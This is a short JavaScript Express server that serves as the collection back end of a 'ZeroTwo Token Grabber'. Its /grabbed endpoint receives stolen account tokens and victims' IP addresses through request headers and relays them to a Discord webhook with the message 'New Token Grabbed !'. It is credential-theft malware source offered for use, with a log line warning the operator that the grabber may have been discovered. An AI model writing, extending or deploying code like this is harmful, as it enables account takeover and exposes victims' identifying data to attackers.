const app = require('express')()

const weblib = require('webhook-discord');

const webhook = "webhook_link"

app.get("/grabbed", async (req, res) => {
    var token = req.headers.token
    var ip = req.headers.ip
    if (token !== undefined) {
        res.sendStatus(200)
        var web = new weblib.Webhook(webhook)
        var embed = new weblib.MessageBuilder()
            .setName(`ZeroTwo Token Grabber`)
            .addField(`New Token Grabbed !`, `${token}`)
            .addField(`IP:`, `${ip}`)
            .setImage("https://www.gifcen.com/wp-content/uploads/2021/02/zero-two-gif-13.gif")
            .setFooter(`ZeroTwo Token Grabber By !"𝑁𝑂𝑇 𝐹𝑈𝐵𝑈𝐾𝐼𝐼#9187`)
            .setColor("#00aaaa")
        web.send(embed)
    } else {
        res.sendStatus(404)
        console.log("Quelqu'un a surment trouver votre API Token Grabber !\nSomeone Found Your Token GRabber API !")
    }
})

app.listen(3000)
